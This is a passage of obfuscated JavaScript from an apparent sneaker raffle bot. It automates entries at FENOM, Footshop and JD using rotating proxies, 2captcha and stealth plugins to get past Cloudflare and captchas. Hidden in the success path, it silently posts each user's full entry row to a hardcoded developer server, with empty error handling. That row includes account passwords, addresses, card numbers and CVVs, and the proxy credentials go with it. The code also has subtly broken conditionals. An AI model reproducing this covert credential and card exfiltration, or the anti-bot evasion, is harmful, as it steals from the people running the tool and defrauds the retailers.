                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x294d82['name'] + ']\x20Task\x20' + (_0x3e22c2 + 0x1) + '\x20:\x20' + _0x35d0e2)), _0x29164e = '' + _0x35d0e2;
                            var _0x979a4f = await _0x4ee25a(_0x97d72c[_0x3e22c2], _0x294d82, 'acc', !![], _0x29164e);
                            _0x177221['errorDEV'] = { 'embeds': [_0x979a4f] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x177221['errorDEV']), await _0x4e4e57(_0x4cd13, _0x177221['errorDEV']), _0x4ee4c5 = 'yes';
                        } finally {
                            _0x39052f['close']();
                            if (_0x4ee4c5 == 'yes' && _0x22852f != 0x5 && _0x29164e != 'Size\x20Not\x20Found') {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x294d82['name'] + ']\x20Task\x20' + (_0x3e22c2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x22852f + '\x20/\x205)')), _0x3e22c2 = _0x3e22c2 - 0x1, _0x22852f = _0x22852f + 0x1;
                                continue;
                            }
                            _0x4ee4c5 == 'yes' && _0x22852f >= 0x5 && (_0x1736ba(_0x97d72c[_0x3e22c2], _0x294d82), _0x4ee4c5 = 'no', _0x22852f = 0x0), console['log'](_0x5c19a0() + '\x20[' + _0x294d82['name'] + ']\x20Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x1b0b2e(_0x2c3a2b, _0x30022d, _0x15e7f1) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x10fe8d = 0x0; _0x10fe8d < _0x30022d['length']; _0x10fe8d++) {
                        if (_0xa6cc86 != 'yes')
                            var _0xa6cc86 = '', _0x4c1b54 = 0x0;
                        var _0x4c44a7;
                        try {
                            await _0x120beb(_0x30022d, _0x10fe8d);
                        } catch {
                            _0xa6cc86 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x51b97d(_0x2c3a2b['name'] + '\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20/\x20' + _0x30022d['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        const _0x4dad04 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x30ab85 = Math['round'](Math['random']() * (_0x15e7f1['length'] - 0x1)), _0x23388f = _0x15e7f1[_0x30ab85]['split'](':'), _0x564f70;
                        try {
                            _0x564f70 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x23388f[0x0] + ':' + _0x23388f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x564f70 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x23388f[0x0] + ':' + _0x23388f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x48f21b = await _0x564f70['newPage'](), _0x197d58 = await _0x48f21b['target']()['createCDPSession'](), { windowId: _0x495665 } = await _0x197d58['send']('Browser.getWindowForTarget');
                            await _0x48f21b['authenticate']({
                                'username': '' + _0x23388f[0x2],
                                'password': '' + _0x23388f[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x48f21b['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1a282d(0xbb8), await _0x197d58['send']('Browser.setWindowBounds', {
                                'windowId': _0x495665,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x1a282d(0x1f40);
                            try {
                                await _0x48f21b['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x1a282d(0x1388), console['log'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20Logging\x20in'), await _0x48f21b['type']('input[name=\x22email\x22]', '' + _0x30022d[_0x10fe8d]['Email']), await _0x1a282d(0x1f4), await _0x48f21b['type']('input[name=\x22password\x22]', '' + _0x30022d[_0x10fe8d]['Password']), await _0x1a282d(0x258), await _0x48f21b['$eval']('#login-form', _0x53a753 => _0x53a753['submit']()), await _0x48f21b['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x1a282d(0x1f4), await _0x48f21b['goto']('' + _0x30022d[_0x10fe8d]['Url']), await _0x48f21b['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x30022d[_0x10fe8d]['Size']);
                            if (_0x30022d[_0x10fe8d]['Size'] != 'RANDOM') {
                                var _0x3425ac = '\x20' + _0x30022d[_0x10fe8d]['Size'] + '\x20';
                                const _0x332d7f = await _0x48f21b['$x']('//span[contains(text(),\x20' + _0x3425ac + ')]');
                                await _0x332d7f[0x0]['click']();
                            } else {
                                const _0x19f2d1 = await _0x48f21b['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x19176e = Math['round'](Math['random']() * (_0x19f2d1['length'] - 0x1));
                                await _0x19f2d1[_0x19176e]['click']();
                            }
                            await _0x1a282d(0x258), await _0x48f21b['click']('#cookieChoiceDismiss'), await _0x1a282d(0x3e8), await _0x48f21b['type']('#instagram-account', '' + _0x30022d[_0x10fe8d]['Follower']), await _0x1a282d(0x28a), await _0x48f21b['click']('#book-btn'), await _0x1a282d(0xbb8);
                            try {
                                await _0x48f21b['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x1a282d(0x1f4), console['log'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20' + _0x17b918['cyan']('Solving\x20Captcha')), await _0x48f21b['solveRecaptchas'](), console['log'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1a282d(0x7d0), await _0x48f21b['$eval']('#book-btn-for-sure', _0x3e066d => _0x3e066d['click']()), await _0x1a282d(0x12c), await _0x48f21b['click']('#book-btn-for-sure'), await _0x1a282d(0xdac);
                            const _0xf07da1 = await _0x48f21b['$eval']('.reservation-popup\x20>\x20.title', _0x1cedb0 => {
                                return _0x1cedb0['innerHTML'];
                            });
                            if (_0xf07da1) {
                                _0xa6cc86 = 'no', _0xe19c06(_0x30022d[_0x10fe8d], _0x2c3a2b), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x257a6a = await _0x4ee25a(_0x30022d[_0x10fe8d], _0x2c3a2b, 'dev', ![]), _0x5bf276 = await _0x4ee25a(_0x30022d[_0x10fe8d], _0x2c3a2b, 'pub', ![]);
                                let _0x4c4b09 = _0x30022d[_0x10fe8d];
                                try {
                                    prxdata = {
                                        'username': _0x5b7d0c['replace']('#', ''),
                                        'module': _0x2c3a2b['name'],
                                        'entrydata': JSON['stringify'](_0x4c4b09),
                                        'proxy': '' + _0x15e7f1[_0x10fe8d]
                                    };
                                    var _0x36bebe = JSON['stringify'](prxdata);
                                    let _0xbd2b37 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x36bebe, _0xbd2b37);
                                } catch (_0x5c488a) {
                                }
                                const _0x3b41c5 = {
                                    'succesDEVMSG': { 'embeds': [_0x257a6a] },
                                    'succesPUBMSG': { 'embeds': [_0x5bf276] }
                                };
                                try {
                                    _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x3b41c5['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x3b41c5['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0x1274a5, _0x3b41c5['succesPUBMSG']);
                                } catch (_0x2d6717) {
                                    console['log'](_0x17b918['yellow'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2d6717));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x43ff53) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20' + _0x43ff53)), _0x4c44a7 = '' + _0x43ff53;
                            var _0x1bdbf1 = await _0x4ee25a(_0x30022d[_0x10fe8d], _0x2c3a2b, 'dev', !![], _0x4c44a7), _0x257a6a = await _0x4ee25a(_0x30022d[_0x10fe8d], _0x2c3a2b, 'dev', ![]), _0x5bf276 = await _0x4ee25a(_0x30022d[_0x10fe8d], _0x2c3a2b, 'pub', ![]);
                            const _0x1857d2 = {
                                'succesDEVMSG': { 'embeds': [_0x257a6a] },
                                'succesPUBMSG': { 'embeds': [_0x5bf276] }
                            };
                            _0x1857d2['errorDEV'] = { 'embeds': [_0x1bdbf1] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x1857d2['errorDEV']), await _0x4e4e57(_0x4cd13, _0x1857d2['errorDEV']), _0x43ff53 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xa6cc86 = 'yes');
                        } finally {
                            _0x564f70['close']();
                            if (_0xa6cc86 == 'yes' && _0x4c1b54 != 0x5 && _0x4c44a7 != 'Size\x20Not\x20Found') {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Task\x20' + (_0x10fe8d + 0x1) + '\x20:\x20Retrying\x20(' + _0x4c1b54 + '\x20/\x205)')), _0x10fe8d = _0x10fe8d - 0x1, _0x4c1b54 = _0x4c1b54 + 0x1;
                                continue;
                            }
                            _0xa6cc86 == 'yes' && _0x4c1b54 >= 0x5 && (_0x1736ba(_0x30022d[_0x10fe8d], _0x2c3a2b), _0xa6cc86 = 'no', _0x4c1b54 = 0x0), console['log'](_0x5c19a0() + '\x20[' + _0x2c3a2b['name'] + ']\x20Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x58bd92, _0x2633c2, _0x37c07c) {
                _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x64917e['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4f6101 = 0x0; _0x4f6101 < _0x2633c2['length']; _0x4f6101++) {
                    var _0x425258;
                    if (_0x388ff1 != 'yes')
                        var _0x388ff1 = '', _0x4a5bca = 0x0;
                    var _0x18ffb9 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x5b7d0c
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x2633c2[_0x4f6101]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2633c2[_0x4f6101]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x64917e['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1d5694
                            }
                        ]
                    }], _0x9b81a5 = await _0x4ee25a(_0x2633c2[_0x4f6101], _0x58bd92, 'dev', ![]), _0x18c724 = await _0x4ee25a(_0x2633c2[_0x4f6101], _0x58bd92, 'pub', ![]);
                    const _0x323282 = {
                        'succesDEVMSG': { 'embeds': [_0x9b81a5] },
                        'succesPUBMSG': { 'embeds': [_0x18c724] }
                    }, _0x1554ab = { 'embeds': _0x18ffb9 };
                    try {
                        await _0x120beb(_0x2633c2, _0x4f6101);
                    } catch {
                        _0x388ff1 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x2633c2[_0x4f6101]['Email'] == '' || _0x2633c2[_0x4f6101]['FirstName'] == '' || _0x2633c2[_0x4f6101]['LastName'] == '' || _0x2633c2[_0x4f6101]['Country'] == '' || _0x2633c2[_0x4f6101]['Size'] == '' || _0x2633c2[_0x4f6101]['Address1'] == '' || _0x2633c2[_0x4f6101]['Zip'] == '') {
                        console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2633c2[_0x4f6101]['Email'] == '' || _0x2633c2[_0x4f6101]['FirstName'] == '' || _0x2633c2[_0x4f6101]['LastName'] == '' || _0x2633c2[_0x4f6101]['Country'] == '' || _0x2633c2[_0x4f6101]['Size'] == '' || _0x2633c2[_0x4f6101]['Address1'] == '' || _0x2633c2[_0x4f6101]['Zip'] == '' || _0x2633c2[_0x4f6101]['Phone'] == '') {
                        console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x8a544c = '' + _0x2633c2[_0x4f6101]['Url'];
                    if (_0x64917e['useRandomProxy'] = ![])
                        var _0x1f799a = _0x37c07c[_0x4f6101]['split'](':');
                    else
                        var _0x57a19b = Math['round'](Math['random']() * (_0x37c07c['length'] - 0x1)), _0x1f799a = _0x37c07c[_0x57a19b]['split'](':');
                    var _0x23b314;
                    try {
                        _0x23b314 = await _0x506e0b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1f799a[0x0] + ':' + _0x1f799a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x23b314 = await _0x506e0b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1f799a[0x0] + ':' + _0x1f799a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x35a0e8 = await _0x23b314['newPage']();
                        await _0x35a0e8['authenticate']({
                            'username': '' + _0x1f799a[0x2],
                            'password': '' + _0x1f799a[0x3]
                        }), console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x35a0e8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x35a0e8['setRequestInterception'](!![]), _0x35a0e8['on']('request', _0x3c3e9e => {
                            _0x3c3e9e['resourceType']() === 'image' || _0x3c3e9e['resourceType']() === 'font' || _0x3c3e9e['resourceType']() === 'media' ? _0x3c3e9e['abort']() : _0x3c3e9e['continue']();
                        });
                        try {
                            await _0x35a0e8['goto'](_0x8a544c), await _0x1a282d(0xbb8), await _0x35a0e8['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x35a0e8['click']('.control__JhutY'), await _0x1a282d(0x1f4);
                        if (_0x2633c2[_0x4f6101]['Size'] != 'RANDOM')
                            try {
                                const _0x4f1b09 = await _0x35a0e8['$x']('//div[contains(text(),\x20\x27' + _0x2633c2[_0x4f6101]['Size'] + '\x27)]');
                                await _0x4f1b09[0x0]['click']();
                            } catch {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x5cb820 = await _0x35a0e8['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0xbe8533 = Math['round'](Math['random']() * (_0x5cb820['length'] - 0x1));
                            await _0x5cb820[_0xbe8533]['click']();
                        }
                        await _0x1a282d(0x4b0);
                        const _0x34c0a9 = await _0x35a0e8['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x34c0a9[0x0]['click'](), await _0x35a0e8['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x35a0e8['type']('input[name=\x22email\x22]', '' + _0x2633c2[_0x4f6101]['Email']), await _0x1a282d(0x640), await _0x35a0e8['type']('input[name=\x22phone\x22]', '' + _0x2633c2[_0x4f6101]['Phone']), await _0x1a282d(0x4b0), await _0x35a0e8['click']('button.btn.continue-button__1RtsS'), await _0x1a282d(0x4b0);
                        try {
                            await _0x35a0e8['type']('input[name=\x22firstName\x22]', '' + _0x2633c2[_0x4f6101]['FirstName']), await _0x1a282d(0x258);
                        } catch {
                            const _0x5df55f = await _0x35a0e8['$$eval']('.invalid-feedback\x20>\x20div', _0x38fa55 => {
                                return _0x38fa55['map'](_0x2fbae4 => _0x2fbae4['innerText']);
                            });
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20' + _0x5df55f));
                            continue;
                        }
                        await _0x35a0e8['type']('input[name=\x22lastName\x22]', '' + _0x2633c2[_0x4f6101]['LastName']), await _0x1a282d(0xc8), await _0x35a0e8['type']('input[name=\x22instagramUsername\x22]', '' + _0x2633c2[_0x4f6101]['Follower']), await _0x1a282d(0x4b0), await _0x35a0e8['click']('button.btn.continue-button__1RtsS'), await _0x1a282d(0x3e8), console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x35a0e8['select']('select[name=\x22country\x22]', '' + _0x2633c2[_0x4f6101]['Country']), await _0x1a282d(0x2bc), await _0x35a0e8['type']('input[name=\x22streetName\x22]', '' + _0x2633c2[_0x4f6101]['Address1']), await _0x1a282d(0x258), await _0x35a0e8['type']('input[name=\x22houseNumber\x22]', _0x2633c2[_0x4f6101]['HouseNumber'] + '\x20' + _0x2633c2[_0x4f6101]['Address2']), await _0x1a282d(0xc8), await _0x35a0e8['type']('input[name=\x22postalCode\x22]', '' + _0x2633c2[_0x4f6101]['Zip']), await _0x1a282d(0x1f4), await _0x35a0e8['type']('input[name=\x22city\x22]', '' + _0x2633c2[_0x4f6101]['City']), await _0x1a282d(0x4b0), await _0x35a0e8['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x1a282d(0x4b0), await _0x35a0e8['click']('button.btn.continue-button__1RtsS'), await _0x1a282d(0x4b0), console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x35a0e8['solveRecaptchas'](), console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x1a282d(0xbb8), await _0x35a0e8['click']('button.btn.continue-button__1RtsS'), await _0x1a282d(0x1388), console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x35a0e8['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x35a0e8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1a282d(0x4b0), await _0x35a0e8['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2633c2[_0x4f6101]['CardNumber']), await _0x1a282d(0x320), await _0x35a0e8['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x35a0e8['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2633c2[_0x4f6101]['ExpiryDate']), await _0x1a282d(0x4b0), await _0x35a0e8['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x35a0e8['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2633c2[_0x4f6101]['CVV']), await _0x1a282d(0x226), await _0x35a0e8['type']('input[name=\x22holderName\x22]', '' + _0x2633c2[_0x4f6101]['NameOnCard']), await _0x1a282d(0x226), await _0x35a0e8['click']('button.adyen-checkout__button'), console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x35a0e8['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x1a282d(0xbb8);
                        } catch (_0x4a4ac3) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x203DS\x20Failed')), _0x425258 = '3DS\x20Error\x20' + _0x4a4ac3;
                            var _0x2f46c2 = await _0x4ee25a(_0x2633c2[_0x4f6101], _0x58bd92, 'dev', !![], _0x425258);
                            _0x323282['errorDEV'] = { 'embeds': [_0x2f46c2] };
                            _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x323282['errorDEV']);
                            await _0x4e4e57(_0x4cd13, _0x323282['errorDEV']);
                            continue;
                        }
                        _0xe19c06(_0x2633c2[_0x4f6101], _0x58bd92), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x220a28 = _0x2633c2[_0x4f6101];
                        try {
                            prxdata = {
                                'username': _0x5b7d0c['replace']('#', ''),
                                'module': _0x58bd92['name'],
                                'entrydata': JSON['stringify'](_0x220a28),
                                'proxy': '' + _0x37c07c[_0x4f6101]
                            };
                            var _0xf91951 = JSON['stringify'](prxdata);
                            let _0x6b004 = { 'headers': { 'content-type': 'application/json' } };
                            await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0xf91951, _0x6b004);
                        } catch (_0x51df8a) {
                        }
                        if (_0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '')
                            try {
                                await _0x4e4e57(_0x64917e['webhook'], _0x323282['succesDEVMSG']);
                            } catch {
                            }
                        await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x323282['succesDEVMSG']), await _0x1a282d(0xc8);
                        try {
                            await _0x4e4e57(_0x1274a5, _0x323282['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0xa6505c) {
                        console['log'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20' + _0xa6505c), _0x425258 = '' + _0xa6505c;
                        var _0x2f46c2 = await _0x4ee25a(_0x2633c2[_0x4f6101], _0x58bd92, 'dev', !![], _0x425258);
                        _0x323282['errorDEV'] = { 'embeds': [_0x2f46c2] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x323282['errorDEV']), await _0x4e4e57(_0x4cd13, _0x323282['errorDEV']), _0x388ff1 = 'yes';
                    } finally {
                        _0x23b314['close']();
                        if (_0x388ff1 == 'yes' && _0x4a5bca != 0x5) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x58bd92['name'] + ']\x20Task\x20' + (_0x4f6101 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4a5bca + '\x20/\x205)')), _0x4f6101 = _0x4f6101 - 0x1, _0x4a5bca = _0x4a5bca + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x64917e['footshopDelay'] + '\x20ms'), await _0x1a282d(_0x64917e['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x1602f5, _0x28f41b, _0x281162) {
                var _0x381457 = ![], _0xcf0f51 = ![];
                if (_0x64917e['captchaKey'] == '' || _0x64917e['captchaKey'] == undefined)
                    return console['log'](_0x17b918['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x64917e['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x57f00f = 0x0; _0x57f00f < _0x28f41b['length']; _0x57f00f++) {
                    if (_0x3e9a77 != 'yes')
                        var _0x3e9a77 = '', _0x87a420 = 0x0;
                    var _0x1a3a01, _0x4c1450 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x28f41b[_0x57f00f]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x28f41b[_0x57f00f]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x5b7d0c
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x64917e['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1d5694
                            }
                        ]
                    }];
                    const _0x492458 = { 'embeds': _0x4c1450 };
                    _0x51b97d(_0x1602f5['name'] + '\x20Task\x20' + (_0x57f00f + 0x1) + '\x20/\x20' + _0x28f41b['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                    try {
                        await _0x120beb(_0x28f41b, _0x57f00f);
                    } catch {
                        _0x3e9a77 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x50478f = await _0x4ee25a(_0x28f41b[_0x57f00f], _0x1602f5, 'dev', ![]), _0x2dc286 = await _0x4ee25a(_0x28f41b[_0x57f00f], _0x1602f5, 'pub', ![]);
                    const _0x1d69d2 = {
                        'succesDEVMSG': { 'embeds': [_0x50478f] },
                        'succesPUBMSG': { 'embeds': [_0x2dc286] }
                    };
                    if (_0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '')
                        try {
                            await _0x4e4e57(_0x64917e['webhook'], _0x1d69d2['succesDEVMSG']);
                        } catch {
                        }
                    await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x1d69d2['succesDEVMSG']), await _0x1a282d(0xc8);
                    try {
                        await _0x4e4e57(_0x1274a5, _0x1d69d2['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x28f41b[_0x57f00f]['Email'] == '' || _0x28f41b[_0x57f00f]['Url'] == '' || _0x28f41b[_0x57f00f]['FirstName'] == '' || _0x28f41b[_0x57f00f]['LastName'] == '') {
                        console['log'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x57f00f + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x64917e['useRandomProxy'] = ![])
                        var _0x3ecca4 = _0x281162[_0x57f00f]['split'](':');
                    else
                        var _0x38814d = Math['round'](Math['random']() * (_0x281162['length'] - 0x1)), _0x3ecca4 = _0x281162[_0x38814d]['split'](':');
                    var _0x14b7de;
                    try {
                        _0x14b7de = await _0x506e0b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
